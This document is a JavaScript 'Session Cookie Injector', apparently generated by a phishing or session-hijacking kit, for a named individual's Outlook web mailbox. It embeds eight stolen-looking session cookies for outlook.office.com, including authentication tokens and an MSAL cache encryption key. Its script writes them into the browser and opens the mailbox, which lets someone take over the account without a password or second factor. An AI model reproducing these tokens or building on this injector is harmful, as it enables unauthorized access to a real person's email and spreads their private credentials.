
// Session Cookie Injector
// Auto-generated on 2025-09-23T15:14:28.531Z
// Session: jaco@smei.co.za (8 cookies)

(function() {
    console.log('🚀 Injecting 8 cookies for session: jaco@smei.co.za');

    const sessionInfo = {
        email: 'jaco@smei.co.za',
        timestamp: '2025-09-23T15:14:28.531Z',
        cookieCount: 8
    };

    console.log('📧 Session info:', sessionInfo);

    const cookies = [
    {
        "name": "SuiteServiceProxyKey",
        "value": "1aHMYyAAIRLeQo6t8Z/zhcPIsLWK8yjMMoU/bo7FdHw=&whlWMbYiY+9OXQDs1dIoaQ==",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": -1,
        "size": 89,
        "httpOnly": false,
        "secure": true,
        "session": true,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "luat",
        "value": "Isq3j3WQH7qlIeJVVucDI+sKaiGK8oK3a+0kBsSHtaC0Q20CqrCdXS+v3dYAC8RpgGjSH9WMRq/Zik/MJhyT1wxYPWcABazQm3y+eTU2Pnl2DjcBioJBP6OsKXIo4/3f/sr/GPLQhM8A6+7ShYV0kL8YihOPY8qfrCSP8j2Y0Us+BazNfnJ66NlgySrZD9OND3wfL9tEJRhvzVRlu3gVQkPaMjLgOqzoDEzI98uy25v49OY0NQoQrfaFi+btwT34K763nP55twqLr0X0YBOECndeAGBS+szrA/MFUlf6gNpjHiOWsfiyTlTD7vqPEqHEXps44mdmQy1U1u87kEYSsw==",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": -1,
        "size": 348,
        "httpOnly": true,
        "secure": true,
        "session": true,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "OWAAppIdType",
        "value": "Exchange",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": 1761232468.410885,
        "size": 20,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "ClientId",
        "value": "4EB550536C244660949F8100EE27FB73",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": 1790176450.299556,
        "size": 40,
        "httpOnly": false,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "DefaultAnchorMailbox",
        "value": "PUID:1003000088D29CF9@29775c6a-2d6e-42ef-a6ea-3e0a46793619",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": -1,
        "size": 78,
        "httpOnly": false,
        "secure": true,
        "session": true,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "UC",
        "value": "e4b33a17e64a4b0aafef0bf79f4a5199",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": -1,
        "size": 34,
        "httpOnly": true,
        "secure": true,
        "session": true,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "OIDC",
        "value": "1",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": 1774278863.000168,
        "size": 5,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "msal.cache.encryption",
        "value": "%7B%22id%22%3A%2201997723-ad7c-7610-889e-7c20b5648424%22%2C%22key%22%3A%22qqQlK8n-XgGYX6XG4X0bsbOeEGPFitZrg55wAGpSqtw%22%7D",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": -1,
        "size": 144,
        "httpOnly": false,
        "secure": true,
        "session": true,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    }
];
    let injected = 0;

    cookies.forEach(cookie => {
        try {
            let cookieStr = cookie.name + '=' + cookie.value + ';';
            cookieStr += 'domain=' + cookie.domain + ';';
            cookieStr += 'path=' + cookie.path + ';';
            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
            if (cookie.secure) cookieStr += 'secure;';
            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';

            document.cookie = cookieStr;
            injected++;
        } catch (e) {
            console.warn('Failed to inject cookie:', cookie.name);
        }
    });

    console.log('✅ Successfully injected ' + injected + ' cookies!');
    console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');

    // Auto-redirect option
    setTimeout(() => {
        if (confirm('Injected ' + injected + ' cookies for jaco@smei.co.za! Open Outlook now?')) {
            window.open('https://outlook.office.com/mail/', '_blank');
        }
    }, 1000);
})();
